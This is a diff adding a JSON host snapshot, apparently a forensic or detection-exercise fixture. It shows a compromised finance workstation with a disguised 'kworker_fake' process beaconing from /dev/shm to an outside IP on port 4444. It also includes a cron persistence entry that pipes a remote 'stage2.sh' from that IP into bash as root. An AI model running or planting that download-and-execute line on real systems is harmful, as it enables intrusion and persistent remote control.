@@ -1,0 +1,53 @@
+{
+  "hostname": "FINANCE-WORKSTATION-09",
+  "os_platform": "Linux / Enterprise Host",
+  "active_sockets": [
+    {
+      "pid": 4180,
+      "process": "sshd",
+      "local_addr": "0.0.0.0:22",
+      "foreign_addr": "0.0.0.0:*",
+      "state": "LISTEN"
+    },
+    {
+      "pid": 8921,
+      "process": "kworker_fake",
+      "local_addr": "10.0.4.15:52134",
+      "foreign_addr": "185.220.101.5:4444",
+      "state": "ESTABLISHED"
+    },
+    {
+      "pid": 9012,
+      "process": "nginx",
+      "local_addr": "0.0.0.0:443",
+      "foreign_addr": "0.0.0.0:*",
+      "state": "LISTEN"
+    }
+  ],
+  "running_processes": [
+    {
+      "pid": 1,
+      "name": "systemd",
+      "exe_path": "/sbin/init",
+      "cmdline": "/sbin/init",
+      "user": "root"
+    },
+    {
+      "pid": 8921,
+      "name": "kworker_fake",
+      "exe_path": "/dev/shm/.stealth_payload",
+      "cmdline": "/dev/shm/.stealth_payload --beacon",
+      "user": "www-data"
+    }
+  ],
+  "persistence_entries": [
+    {
+      "source": "/etc/cron.d/sync_service",
+      "entry": "*/5 * * * * root curl -s http://185.220.101.5/stage2.sh | bash"
+    },
+    {
+      "source": "/etc/crontab",
+      "entry": "0 2 * * * root /usr/bin/logrotate"
+    }
+  ]
+}
